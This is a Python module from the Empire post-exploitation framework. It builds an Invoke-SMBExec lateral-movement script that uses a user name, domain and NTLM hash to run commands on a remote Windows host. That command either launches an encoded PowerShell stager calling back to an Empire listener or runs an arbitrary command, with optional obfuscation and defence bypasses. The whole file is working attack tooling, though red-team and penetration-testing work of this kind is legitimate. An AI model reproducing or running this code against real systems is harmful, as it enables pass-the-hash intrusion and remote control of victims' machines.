from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        listener_name = params['Listener']
        command = params['Command']
        computer_name = params['ComputerName']
        user_name = params['Username']
        ntlm_hash = params['Hash']
        domain = params['Domain']
        service = params['Service']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        # Only "Command" or "Listener" but not both
        if (listener_name == "" and command  == ""):
            return handle_error_message("[!] Listener or Command required")
        if (listener_name and command):
            return handle_error_message("[!] Cannot use Listener and Command at the same time")

        module_source = main_menu.installPath + "/data/module_source/lateral_movement/Invoke-SMBExec.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()
        script = module_code

        if not main_menu.listeners.is_listener_valid(listener_name) and not command:
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        elif listener_name:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                           userAgent=user_agent, obfuscate=obfuscate,
                                                           obfuscationCommand=obfuscate_command, proxy=proxy,
                                                           proxyCreds=proxy_creds, bypasses=params['Bypasses'])

            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")

            Cmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher

        else:
            Cmd = '%COMSPEC% /C start /b ' + command
            print(helpers.color("[*] Running command:  " + Cmd))

        script_end = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computer_name, user_name, domain, ntlm_hash, Cmd)
        outputf = params.get("OutputFunction", "Out-String")
        script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
